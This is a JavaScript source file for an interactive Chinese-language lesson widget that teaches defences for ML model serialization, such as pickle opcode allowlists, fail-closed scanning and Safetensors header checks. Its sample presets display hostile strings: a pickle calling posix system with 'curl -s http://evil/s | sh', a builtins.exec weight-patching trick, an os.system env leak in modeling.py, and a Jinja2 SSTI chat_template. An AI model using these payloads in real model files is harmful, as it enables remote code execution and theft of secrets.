/* ==========================================================================
   可复用交互组件：模型序列化安全与恶意载荷扫描实验台（Lesson 0018+）
   零依赖原生 JS，完全复用 tufte-course.css 中 .grl-* 样式。
   模式一：Pickle VM 操作码反汇编与 Fail-Closed 门禁演练台
   模式二：Safetensors 头部校验器与跨格式模型迁移门禁模拟器
   ========================================================================== */

(function () {
  "use strict";

  function escapeHtml(str) {
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function initModelSerializationLab(container) {
    const dataEl = container.querySelector("script.model-serialization-lab-data");
    let config = {};
    if (dataEl) {
      try {
        config = JSON.parse(dataEl.textContent);
      } catch (e) {
        config = {};
      }
    }

    const PRESETS = [
      {
        id: "clean-state-dict",
        label: "1. 标准 PyTorch state_dict",
        desc: "合法的 PyTorch 权重压缩包（archive/data.pkl），ZIP CRC 校验完整，反汇编后仅调用 collections.OrderedDict 与 torch._utils._rebuild_tensor_v2 等白名单张量重建原语，无伴生脚本风险。",
        containerKind: "ZIP (Standard PyTorch .pt)",
        crcStatus: "CRC32 全部匹配",
        hasMaliciousPickle: false,
        needsWhitelistDiff: false,
        hasParserBypass: false,
        hasCompanionRisk: false,
        disasm: [
          "0x0000: \\x80\\x02        PROTO      2",
          "0x0002: }               EMPTY_DICT",
          "0x0003: q\\x00           BINPUT     0",
          "0x0005: X\\x0b...        SHORT_BINUNICODE 'layer.weight'",
          "0x0015: c               GLOBAL     'torch._utils _rebuild_tensor_v2'",
          "0x0037: (               MARK",
          "0x0038: c               GLOBAL     'torch FloatStorage'",
          "0x004d: R               REDUCE     (安全白名单原语构建张量)",
          "0x004e: s               SETITEM",
          "0x004f: .               STOP"
        ],
        apply: { allowlistOnly: true, failClosed: true, scanCompanions: true }
      },
      {
        id: "classic-rce-pickle",
        label: "2. 经典 Pickle RCE 投毒",
        desc: "在模型加载瞬间触发恶意反序列化：通过 GLOBAL ('posix' / 'system') 压入系统命令执行函数并立即执行 REDUCE (0x52) 弹出反向 Shell。黑名单与白名单引擎均可命中。",
        containerKind: "ZIP (Standard PyTorch .pt)",
        crcStatus: "CRC32 正常（伪装合法归档）",
        hasMaliciousPickle: true,
        needsWhitelistDiff: false,
        hasParserBypass: false,
        hasCompanionRisk: false,
        disasm: [
          "0x0000: \\x80\\x04        PROTO      4",
          "0x0002: \\x95\\x2e\\x00... FRAME      46",
          "0x000b: c               GLOBAL     'posix system'   [危险符号!]",
          "0x001a: \\x8c\\x1e        SHORT_BINUNICODE 'curl -s http://evil/s | sh'",
          "0x003a: \\x85            TUPLE1",
          "0x003b: R               REDUCE     [RCE 立即触发!]",
          "0x003c: .               STOP"
        ],
        apply: { allowlistOnly: true, failClosed: true, scanCompanions: true }
      },
      {
        id: "crc-sleepy-bypass",
        label: "3. CRC 篡改 + Sleepy Pickle 隐蔽后门",
        desc: "双层复合绕过样本：外层故意篡改 ZIP 局部头 CRC32 并打乱标志位（CVE-2025-1945 / 10156 范式），使 Python zipfile 抛异常并导致 Fail-Open 扫描器跳过；内层改用 STACK_GLOBAL + builtins.getattr / exec 实施 Sleepy Pickle 内存态权重改写，避开黑名单。",
        containerKind: "Malformed ZIP Polyglot (CRC=0xDEADBEEF)",
        crcStatus: "CRC32 校验失败 (PyTorch 仍宽容加载!)",
        hasMaliciousPickle: true,
        needsWhitelistDiff: true,
        hasParserBypass: true,
        hasCompanionRisk: false,
        disasm: [
          "[ZIP LFH] flags=0x0008, crc32=0xdeadbeef (故意错配触发 zipfile.BadZipFile!)",
          "0x0000: \\x80\\x04        PROTO      4",
          "0x000b: \\x8c\\x08        SHORT_BINUNICODE 'builtins'",
          "0x0015: \\x8c\\x04        SHORT_BINUNICODE 'exec'          [绕过常规 GLOBAL 匹配]",
          "0x001b: \\x93            STACK_GLOBAL                  [动态拼接非标准危险调用!]",
          "0x001c: \\x8c\\x34        SHORT_BINUNICODE 'torch.nn.Linear.forward = trojan_fn'",
          "0x0052: \\x85            TUPLE1",
          "0x0053: R               REDUCE                        [内存热补丁 · 不落盘不弹 Shell!]",
          "0x0054: .               STOP"
        ],
        apply: { allowlistOnly: true, failClosed: true, scanCompanions: true }
      },
      {
        id: "safetensors-companion-trap",
        label: "4. Safetensors 伴生配置投毒 (SSTI / auto_map)",
        desc: "主权重 model.safetensors 本身 100% 合规且无字节码，但同仓库伴生 config.json 注入了 auto_map 远程代码指针，且 tokenizer_config.json 嵌入恶意 Jinja2 chat_template（CVE-2024-34359 SSTI 同源手法）。",
        containerKind: "Safetensors + HF Companion JSONs",
        crcStatus: "权重头 100% 合规（零字节码）",
        hasMaliciousPickle: false,
        needsWhitelistDiff: false,
        hasParserBypass: false,
        hasCompanionRisk: true,
        disasm: [
          "[model.safetensors] header_len=412 (< 100MB), data_offsets 连续对齐 -> SAFE",
          "[config.json]       \"auto_map\": {\"AutoModel\": \"evil_repo--modeling.CustomModel\"} [风险!]",
          "[modeling.py]       def __init__(): os.system('env > /tmp/leak')  (trust_remote_code=True 触发)",
          "[tokenizer_config]  \"chat_template\": \"{{ ''.__class__.__mro__[1].__subclasses__()... }}\" [SSTI!]"
        ],
        apply: { allowlistOnly: true, failClosed: true, scanCompanions: true }
      }
    ];

    const FORMAT_EXAMPLES = [
      {
        label: "合规 Safetensors (PyTorch 2.6+)",
        headerBytes: 16384,
        offsetOverlap: false,
        pytorchVersion: ">=2.6.0",
        fileFormat: "safetensors",
        trustRemoteCode: false
      },
      {
        label: "HeaderTooLarge DoS (>100 MB)",
        headerBytes: 128000000,
        offsetOverlap: false,
        pytorchVersion: ">=2.6.0",
        fileFormat: "safetensors",
        trustRemoteCode: false
      },
      {
        label: "Legacy PyTorch <=2.5.1 (CVE-2025-32434)",
        headerBytes: 8192,
        offsetOverlap: false,
        pytorchVersion: "<=2.5.1",
        fileFormat: "pt",
        trustRemoteCode: true
      }
    ];

    const state = {
      activeTab: "opcode", // "opcode" | "format"
      presetId: "crc-sleepy-bypass",
      allowlistOnly: true,
      failClosed: true,
      scanCompanions: true,
      // 模式二
      headerBytes: 16384,
      offsetOverlap: false,
      pytorchVersion: "<=2.5.1",
      fileFormat: "pt", // "safetensors" | "pt" | "keras" | "onnx"
      trustRemoteCode: false
    };

    function getCurrentPreset() {
      return PRESETS.find((p) => p.id === state.presetId) || PRESETS[0];
    }

    function evaluateOpcodePreset(preset) {
      // 反例：传统黑名单 + Fail-Open 扫描器（仅抓经典 GLOBAL os/posix，遇到 CRC 异常跳过、不查白名单、不看伴生）
      let legacyScanner;
      if (preset.id === "clean-state-dict") {
        legacyScanner = {
          tone: "is-ok",
          verdict: "放行 · 无黑名单敏感词",
          meta: "未发现 os/subprocess",
          desc: "该样本本身确实合法；但传统黑名单引擎放行只是因为没命中敏感词，并非真正验证了全量操作码属于安全张量集合。"
        };
      } else if (preset.id === "classic-rce-pickle") {
        legacyScanner = {
          tone: "is-ok",
          verdict: "拦截 · 命中黑名单 posix.system",
          meta: "匹配硬编码危险模块列表",
          desc: "能拦截最原始的 os.system / subprocess.Popen 样本，但这种防线极易被间接反射调用与畸形包装绕过。"
        };
      } else if (preset.id === "crc-sleepy-bypass") {
        legacyScanner = {
          tone: "is-bad",
          verdict: "严重漏报 (Fail-Open 放行!)",
          meta: "zipfile 抛异常跳过 + 漏抓 builtins.exec",
          desc: "遭遇恶意篡改的 ZIP CRC 后抛出 BadZipFile 异常并 Fail-Open 跳过文件；即便成功解压，黑名单也常遗漏 STACK_GLOBAL 反射篡改权重后门。"
        };
      } else {
        legacyScanner = {
          tone: "is-bad",
          verdict: "盲区放行 · 仅扫权重不看伴生",
          meta: "safetensors 正常即整仓放行",
          desc: "看到权重是 .safetensors 就直接给仓库发绿灯，完全无视同目录下的 auto_map 远程脚本指针与 Jinja2 SSTI 模板注入。"
        };
      }

      // 推荐：自研 Pure Go Fail-Closed 门禁引擎（完全联动 3 个开关）
      let modernVerdict;
      if (preset.id === "clean-state-dict") {
        modernVerdict = {
          tone: state.allowlistOnly ? "is-ok" : "is-warn",
          verdict: state.allowlistOnly ? "精准放行 · 全部操作码属白名单" : "降级放行 · 未启用白名单校验",
          meta: state.allowlistOnly ? "OrderedDict + _rebuild_tensor_v2" : "仅依赖黑名单排雷存在盲区",
          desc: state.allowlistOnly
            ? "静态字节码状态机确认无未知符号导入与异常归档结构，且零执行开销下完成全量白名单收敛，可安全进入下游流水线。"
            : "建议开启「白名单优先」，避免依赖穷举不完的黑名单函数库。"
        };
      } else if (preset.id === "classic-rce-pickle") {
        modernVerdict = {
          tone: "is-ok",
          verdict: "毫秒级阻断 · 命中高危 GLOBAL/REDUCE",
          meta: "静态操作码拦截（零反序列化）",
          desc: "Pure Go Pickle 状态机在流式扫描前 64 字节即捕获 GLOBAL('posix','system') 与 REDUCE(0x52)，无需启动 Python 解释器即可就地阻断。"
        };
      } else if (preset.id === "crc-sleepy-bypass") {
        if (!state.failClosed) {
          modernVerdict = {
            tone: "is-bad",
            verdict: "漏报失守 · Fail-Open 放行畸形包!",
            meta: "已关闭 Fail-Closed 畸形拦截",
            desc: "由于关闭了 Fail-Closed 与宽容归档解析，外层 CRC 篡改直接导致扫描器放弃解析，PyTorch 运行时加载后将当场触发 Sleepy Pickle 内存篡改！"
          };
        } else if (!state.allowlistOnly) {
          modernVerdict = {
            tone: "is-warn",
            verdict: "告警畸形 CRC · 但未收口 STACK_GLOBAL",
            meta: "已关闭操作码白名单",
            desc: "Fail-Closed 拦截了损坏的 ZIP，但如果攻击者修复 CRC 后改用冷门反射类构造 Sleepy Pickle，仅靠黑名单依然会漏过 STACK_GLOBAL。"
          };
        } else {
          modernVerdict = {
            tone: "is-ok",
            verdict: "双重截杀 · 畸形归档 + STACK_GLOBAL 阻断",
            meta: "Fail-Closed + 白名单双保险",
            desc: "第一重宽容读出流立即发现 CRC 与标准偏离并触发 Fail-Closed 拦截；第二重操作码白名单同步阻断 STACK_GLOBAL('builtins','exec') 内存劫持。"
          };
        }
      } else {
        if (!state.scanCompanions) {
          modernVerdict = {
            tone: "is-bad",
            verdict: "漏报失守 · 未审计伴生 JSON/SSTI",
            meta: "已关闭伴生文件联合检查",
            desc: "model.safetensors 确实无毒，但下游推理脚本若开启 trust_remote_code=True 或渲染 Jinja2 chat_template，仍会被同仓伴生文件接管服务器。"
          };
        } else {
          modernVerdict = {
            tone: "is-ok",
            verdict: "全仓截获 · Safetensors 无毒但伴生高危",
            meta: "auto_map + Jinja2 SSTI 双阻断",
            desc: "确认权重层安全的同时，联动识别出 config.json 的 auto_map 远程执行链与高危模板语法，拒绝自动放行并强制开启人工代码审查。"
          };
        }
      }

      return { legacyScanner, modernVerdict };
    }

    function renderOpcodeTab() {
      const preset = getCurrentPreset();
      const res = evaluateOpcodePreset(preset);

      return `
        <div class="grl-preset-bar">
          ${PRESETS.map(
            (p) => `
              <button type="button" class="grl-pill ${state.presetId === p.id ? "active" : ""}" data-preset="${p.id}">
                ${escapeHtml(p.label)}
              </button>
            `
          ).join("")}
        </div>

        <p style="font-size:0.84rem;color:var(--ink-secondary);margin:0 0 0.85rem;padding:0.55rem 0.78rem;background:#faf8f2;border-left:3px solid var(--accent-blue);border-radius:0 4px 4px 0;">
          <strong>样本解剖：</strong>${escapeHtml(preset.desc)}
        </p>

        <div class="grl-layout">
          <div class="grl-controls">
            <div class="grl-control-group">
              <span class="grl-control-label">1. 核心扫描防线策略开关</span>
              <label class="grl-toggle">
                <input type="checkbox" data-toggle="allowlist" ${state.allowlistOnly ? "checked" : ""} />
                <span>启用 <strong>Pickle 操作码白名单优先</strong>（仅放行已知安全张量原语，拒绝 <code>STACK_GLOBAL</code> 等非标导入）</span>
              </label>
              <label class="grl-toggle">
                <input type="checkbox" data-toggle="failclosed" ${state.failClosed ? "checked" : ""} />
                <span>启用 <strong>Fail-Closed 策略 + 宽容归档解包</strong>（CRC 损坏、<code>7z</code> 非标包装直接阻断，绝不异常跳过）</span>
              </label>
              <label class="grl-toggle">
                <input type="checkbox" data-toggle="companions" ${state.scanCompanions ? "checked" : ""} />
                <span>启用 <strong>全仓伴生文件联动审计</strong>（检测 <code>auto_map</code> / <code>trust_remote_code</code> / Jinja2 SSTI）</span>
              </label>
            </div>

            <div class="grl-control-group">
              <span class="grl-control-label">2. 目标制品物理指纹</span>
              <div style="font-size:0.77rem;line-height:1.58;color:var(--ink-secondary);">
                <div>&bull; <strong>容器封装：</strong><code>${escapeHtml(preset.containerKind)}</code></div>
                <div>&bull; <strong>完整性校验：</strong><code>${escapeHtml(preset.crcStatus)}</code></div>
                <div>&bull; <strong>执行隔离：</strong>纯 Go 流式字节码/JSON 解析，<strong>0 次 Python <code>pickle.load()</code></strong></div>
              </div>
            </div>
          </div>

          <div>
            <div class="grl-compare-grid" style="grid-template-columns:repeat(2,minmax(0,1fr));">
              <div class="grl-card ${res.legacyScanner.tone}">
                <div class="grl-card-kicker">传统方案 · 黑名单 + Fail-Open</div>
                <div class="grl-card-title">${escapeHtml(res.legacyScanner.verdict)}</div>
                <div class="grl-card-meta">${escapeHtml(res.legacyScanner.meta)}</div>
                <p class="grl-card-desc">${escapeHtml(res.legacyScanner.desc)}</p>
              </div>

              <div class="grl-card ${res.modernVerdict.tone}">
                <div class="grl-card-kicker">自研内核 · Fail-Closed + 白名单联动</div>
                <div class="grl-card-title">${escapeHtml(res.modernVerdict.verdict)}</div>
                <div class="grl-card-meta">${escapeHtml(res.modernVerdict.meta)}</div>
                <p class="grl-card-desc">${escapeHtml(res.modernVerdict.desc)}</p>
              </div>
            </div>

            <div class="grl-payload-box">
              <div class="grl-payload-head">
                <span class="grl-payload-title">静态字节码反汇编 / 结构检查切片（Zero-Execution Disassembly）</span>
                <span class="badge ${res.modernVerdict.tone === "is-ok" ? "badge-ok" : res.modernVerdict.tone === "is-warn" ? "badge-warn" : "badge-danger"}">
                  ${escapeHtml(res.modernVerdict.verdict)}
                </span>
              </div>
              <pre class="grl-payload-pre"><code>${escapeHtml(preset.disasm.join("\n"))}</code></pre>
            </div>
          </div>
        </div>
      `;
    }

    function evaluateFormatGate() {
      const hdr = Number(state.headerBytes) || 0;
      const maxHdr = 100000000; // 100,000,000 bytes (huggingface/safetensors MAX_HEADER_SIZE)
      const isSafetensors = state.fileFormat === "safetensors";
      const headerTooLarge = isSafetensors && hdr > maxHdr;
      const headerValid = !isSafetensors ? "不适用 (非 Safetensors)" : headerTooLarge ? "越界 (HeaderTooLarge)" : state.offsetOverlap ? "偏移重叠/越界!" : "合法 (<= 100 MB)";

      let verdict = "ALLOW · 满足现代安全底座要求";
      let badgeCls = "badge-ok";
      let execRisk = "极低（无反序列化 VM）";
      let cveExposure = "无已知格式级 RCE 暴露";
      let actionTitle = "可入库 + 叠加 Sigstore 签名";
      const actions = [];

      if (isSafetensors) {
        if (headerTooLarge || state.offsetOverlap) {
          verdict = "BLOCK · Safetensors 畸形头 DoS / 越界";
          badgeCls = "badge-danger";
          execRisk = "高（内存 OOM / 越界读取风险）";
          cveExposure = headerTooLarge ? "触发 HeaderTooLarge 拒绝服务" : "违反 data_offsets 连续不变量";
          actionTitle = "立即阻断并拒绝 mmap 加载";
          if (headerTooLarge) {
            actions.push("前 8 字节 uint64 声明长度超过官方 MAX_HEADER_SIZE = 100,000,000 字节上限，防 JSON 解析耗尽内存。");
          }
          if (state.offsetOverlap) {
            actions.push("检测到张量 data_offsets 区间重叠、反向或超出文件总大小，必须按畸形文件 Fail-Closed 拦截。");
          }
        } else if (state.trustRemoteCode) {
          verdict = "WARN · 权重安全但 trust_remote_code 暴露";
          badgeCls = "badge-warn";
          execRisk = "高（绕过权重格式直接执行 .py）";
          cveExposure = "auto_map 远程代码执行风险";
          actionTitle = "剥离 auto_map 或禁 trust_remote_code";
          actions.push("虽然权重采用 Safetensors，但推理端开启 trust_remote_code=True 会直接执行仓内 modeling_*.py，须在代码与网关侧双禁用。");
        } else {
          actions.push("Safetensors 头部长度与连续张量偏移校验全部通过，支持零拷贝 mmap 安全加载。");
        }
      } else if (state.fileFormat === "pt") {
        if (state.pytorchVersion === "<=2.5.1") {
          verdict = "BLOCK · 高危 CVE-2025-32434 暴露";
          badgeCls = "badge-danger";
          execRisk = "极高（即使 weights_only=True 仍可 RCE）";
          cveExposure = "CVE-2025-32434 (CVSS 9.3) + Pickle RCE";
          actionTitle = "强制升级 PyTorch >=2.6 且转 Safetensors";
          actions.push("PyTorch <= 2.5.1 存在 CVE-2025-32434：由于 _legacy_load 路径校验不一致，传入 weights_only=True 仍可被构造包触发 RCE！");
          actions.push("建议立即使用 Pure Go 静态扫描器拦截恶意操作码，并将历史 .pt 权重批量转换为 .safetensors。");
        } else {
          verdict = "WARN · 遗留 Pickle 格式须白名单扫描";
          badgeCls = "badge-warn";
          execRisk = "中（依赖默认 weights_only=True 与安全白名单）";
          cveExposure = "需防范人为传 weights_only=False 回退";
          actionTitle = "静态字节码扫描 + 限期迁移 Safetensors";
          actions.push("PyTorch >= 2.6.0 已将 weights_only 默认设为 True 并修复 CVE-2025-32434，但若代码显式写 weights_only=False 仍可直接 RCE。");
        }
      } else if (state.fileFormat === "keras") {
        verdict = "BLOCK / REVIEW · Keras Lambda 与 safe_mode 绕过面";
        badgeCls = "badge-danger";
        execRisk = "高（Lambda 字节码 / 内置类滥用）";
        cveExposure = "CVE-2024-3660 · CVE-2025-1550";
        actionTitle = "禁 Lambda 并检查 config.json 配置项";
        actions.push("历史 CVE-2024-3660 与 CVE-2025-1550 证实 Keras safe_mode=True 可被恶意配置与内置工具（如 get_file）绕过，必须独立静态审计。");
      } else {
        verdict = "WARN · 审计 ONNX external_data 路径与符号链接";
        badgeCls = "badge-warn";
        execRisk = "中-高（任意文件读写/路径穿越）";
        cveExposure = "CVE-2025-51480 · CVE-2026-27489 (onnx <1.21.0)";
        actionTitle = "校验 external_data.location 并升级 onnx >=1.21.0";
        actions.push("静态扫描 .onnx Protobuf 中所有 TensorProto.external_data 的 location 字段，严禁出现 ..、绝对路径或软链接逃逸。");
      }

      if (state.trustRemoteCode && !isSafetensors) {
        actions.push("检测到推理配置允许 trust_remote_code=True：这是全仓级 RCE 放大器，应作为独立 CI 红线阻断。");
      }

      actions.push("配套防篡改基线：结合 sigstore/model-transparency (Apache-2.0) 对制品 SHA256 进行构建签名验签（详见 Lesson 0020）。");

      return { verdict, badgeCls, headerValid, execRisk, cveExposure, actionTitle, actions };
    }

    function renderFormatOutput() {
      const r = evaluateFormatGate();
      return `
        <div class="grl-impact-panel" style="margin-bottom:0.85rem;">
          <div class="grl-impact-head">
            <span>模型序列化格式与运行时版本门禁裁决结果</span>
            <span class="badge ${r.badgeCls}">${escapeHtml(r.verdict)}</span>
          </div>
          <div class="grl-impact-list">
            <div class="grl-impact-item ${r.badgeCls === "badge-ok" ? "is-clear" : "is-hit"}">
              <strong>推荐门禁动作：</strong>${escapeHtml(r.actionTitle)}
            </div>
          </div>
        </div>

        <div class="grl-kpi-grid">
          <div class="grl-kpi-card">
            <div class="grl-kpi-label">Safetensors 头部状态</div>
            <div class="grl-kpi-val">${escapeHtml(r.headerValid)}</div>
          </div>
          <div class="grl-kpi-card">
            <div class="grl-kpi-label">反序列化 / 逃逸风险</div>
            <div class="grl-kpi-val">${escapeHtml(r.execRisk)}</div>
          </div>
          <div class="grl-kpi-card">
            <div class="grl-kpi-label">典型 CVE / 攻击面</div>
            <div class="grl-kpi-val">${escapeHtml(r.cveExposure)}</div>
          </div>
          <div class="grl-kpi-card">
            <div class="grl-kpi-label">trust_remote_code 状态</div>
            <div class="grl-kpi-val" style="color:${state.trustRemoteCode ? "var(--danger)" : "var(--ok)"};">${state.trustRemoteCode ? "开启 (高危!)" : "已禁用"}</div>
          </div>
        </div>

        <div class="grl-bar-card">
          <div style="font-size:0.82rem;font-weight:700;color:var(--ink);margin-bottom:0.45rem;">门禁引擎策略明细与修复路径：</div>
          <ul style="margin:0;padding-left:1.1rem;font-size:0.8rem;line-height:1.58;color:var(--ink-secondary);">
            ${r.actions.map((a) => `<li>${escapeHtml(a)}</li>`).join("")}
          </ul>
        </div>
      `;
    }

    function updateFormatOutput() {
      const out = container.querySelector(".grl-msl-format-out");
      if (out) out.innerHTML = renderFormatOutput();
    }

    function renderFormatTab() {
      return `
        <div class="grl-controls" style="margin-bottom:0.9rem;">
          <div class="grl-preset-bar" style="margin-bottom:0.45rem;">
            ${FORMAT_EXAMPLES.map(
              (ex, idx) => `
                <button type="button" class="grl-pill" data-fmtex="${idx}">
                  载入样例：${escapeHtml(ex.label)}
                </button>
              `
            ).join("")}
          </div>

          <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:0.75rem;">
            <div>
              <span class="grl-control-label">模型制品序列化格式</span>
              <div class="grl-pill-group" style="margin-top:0.35rem;">
                <button type="button" class="grl-pill ${state.fileFormat === "safetensors" ? "active" : ""}" data-fmtkind="safetensors">.safetensors</button>
                <button type="button" class="grl-pill ${state.fileFormat === "pt" ? "active" : ""}" data-fmtkind="pt">.pt / .pth (Pickle)</button>
                <button type="button" class="grl-pill ${state.fileFormat === "keras" ? "active" : ""}" data-fmtkind="keras">.keras / .h5</button>
                <button type="button" class="grl-pill ${state.fileFormat === "onnx" ? "active" : ""}" data-fmtkind="onnx">.onnx</button>
              </div>
            </div>

            <div>
              <span class="grl-control-label">推理环境 PyTorch 版本</span>
              <div class="grl-pill-group" style="margin-top:0.35rem;">
                <button type="button" class="grl-pill ${state.pytorchVersion === "<=2.5.1" ? "active" : ""}" data-ptver="<=2.5.1">PyTorch &le; 2.5.1 (脆弱)</button>
                <button type="button" class="grl-pill ${state.pytorchVersion === ">=2.6.0" ? "active" : ""}" data-ptver=">=2.6.0">PyTorch &ge; 2.6.0 (加固)</button>
              </div>
            </div>

            <div>
              <span class="grl-control-label">Safetensors 头部声明长度（字节，上限 100,000,000）</span>
              <input type="number" data-fmtinput="hdrbytes" value="${escapeHtml(state.headerBytes)}" min="0" step="1024"
                style="width:100%;margin-top:0.35rem;padding:0.4rem 0.6rem;border:1px solid var(--rule);border-radius:4px;font-family:var(--font-mono);font-size:0.8rem;background:var(--surface);color:var(--ink);" />
            </div>
          </div>

          <div style="display:flex;flex-wrap:wrap;gap:1rem;padding-top:0.45rem;border-top:1px dashed var(--rule);">
            <label class="grl-toggle">
              <input type="checkbox" data-toggle="overlap" ${state.offsetOverlap ? "checked" : ""} />
              <span>模拟 <strong><code>data_offsets</code> 重叠或越界</strong>（破坏零拷贝安全不变量）</span>
            </label>
            <label class="grl-toggle">
              <input type="checkbox" data-toggle="trustremote" ${state.trustRemoteCode ? "checked" : ""} />
              <span>推理加载端开启 <strong><code>trust_remote_code=True</code></strong></span>
            </label>
          </div>
        </div>

        <div class="grl-msl-format-out">${renderFormatOutput()}</div>
      `;
    }

    function render() {
      const title = config.title || "交互实验台：模型字节码反汇编与格式迁移门禁";
      const intro =
        config.intro ||
        "在模式一中对比传统黑名单 Fail-Open 与 Pure Go Fail-Closed+白名单引擎；在模式二中测试 Safetensors 100 MB 头部上限与 PyTorch CVE-2025-32434 版本门禁。";

      container.innerHTML = `
        <div class="widget-header">
          <h3 class="widget-title">${escapeHtml(title)}</h3>
          <div class="widget-status">Lesson 0018 · Serialization Security Lab</div>
        </div>
        <p style="font-size:0.9rem;color:var(--ink-muted);margin-bottom:0.9rem;">${escapeHtml(intro)}</p>

        <div class="grl-tabs">
          <button type="button" class="grl-tab-btn ${state.activeTab === "opcode" ? "active" : ""}" data-tab="opcode">
            <span class="grl-tab-num">1</span>
            模式一：Pickle 操作码反汇编与绕过拦截演练
          </button>
          <button type="button" class="grl-tab-btn ${state.activeTab === "format" ? "active" : ""}" data-tab="format">
            <span class="grl-tab-num">2</span>
            模式二：Safetensors 头部校验与跨格式 CVE 门禁
          </button>
        </div>

        ${state.activeTab === "opcode" ? renderOpcodeTab() : renderFormatTab()}
      `;

      bindEvents();
    }

    function bindEvents() {
      container.querySelectorAll("[data-tab]").forEach((btn) => {
        btn.addEventListener("click", () => {
          state.activeTab = btn.dataset.tab;
          render();
        });
      });

      container.querySelectorAll("[data-preset]").forEach((btn) => {
        btn.addEventListener("click", () => {
          const found = PRESETS.find((p) => p.id === btn.dataset.preset);
          if (!found) return;
          state.presetId = found.id;
          Object.assign(state, found.apply);
          render();
        });
      });

      container.querySelectorAll("[data-toggle]").forEach((cb) => {
        cb.addEventListener("change", () => {
          const t = cb.dataset.toggle;
          if (t === "allowlist") state.allowlistOnly = cb.checked;
          if (t === "failclosed") state.failClosed = cb.checked;
          if (t === "companions") state.scanCompanions = cb.checked;
          if (t === "overlap") state.offsetOverlap = cb.checked;
          if (t === "trustremote") state.trustRemoteCode = cb.checked;
          if (state.activeTab === "format") updateFormatOutput();
          else render();
        });
      });

      container.querySelectorAll("[data-fmtex]").forEach((btn) => {
        btn.addEventListener("click", () => {
          const ex = FORMAT_EXAMPLES[Number(btn.dataset.fmtex)];
          if (!ex) return;
          state.headerBytes = ex.headerBytes;
          state.offsetOverlap = ex.offsetOverlap;
          state.pytorchVersion = ex.pytorchVersion;
          state.fileFormat = ex.fileFormat;
          state.trustRemoteCode = ex.trustRemoteCode;
          render();
        });
      });

      container.querySelectorAll("[data-fmtkind]").forEach((btn) => {
        btn.addEventListener("click", () => {
          state.fileFormat = btn.dataset.fmtkind;
          render();
        });
      });

      container.querySelectorAll("[data-ptver]").forEach((btn) => {
        btn.addEventListener("click", () => {
          state.pytorchVersion = btn.dataset.ptver;
          render();
        });
      });

      container.querySelectorAll("[data-fmtinput]").forEach((inp) => {
        inp.addEventListener("input", (e) => {
          state.headerBytes = e.target.value;
          updateFormatOutput();
        });
      });
    }

    render();
  }

  document.addEventListener("DOMContentLoaded", () => {
    document
      .querySelectorAll('[data-widget="model-serialization-lab"]')
      .forEach(initModelSerializationLab);
  });
})();
